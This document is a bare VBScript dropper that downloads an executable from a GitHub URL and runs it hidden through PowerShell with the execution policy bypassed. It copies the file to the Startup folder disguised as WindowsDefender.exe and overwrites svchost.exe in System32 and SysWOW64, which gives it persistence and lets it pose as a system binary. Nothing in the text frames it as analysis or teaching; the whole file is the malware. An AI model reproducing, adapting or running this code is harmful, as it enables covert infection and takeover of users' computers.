Set objShell = CreateObject("WScript.Shell")
Dim url, destinations, i, destPath

url = "https://github.com/AmjadBalls/V/raw/refs/heads/main/svchost.exe"

destinations = Array( _
    objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.exe", _
    "C:\Windows\SysWOW64\svchost.exe", _
    "C:\Windows\System32\svchost.exe" _
)

For i = LBound(destinations) To UBound(destinations)
    destPath = destinations(i)
    objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
        """Invoke-WebRequest -Uri '" & url & "' -OutFile '" & destPath & "'; " & _
        "Start-Process '" & destPath & "' -WindowStyle Hidden""", 0, False
Next
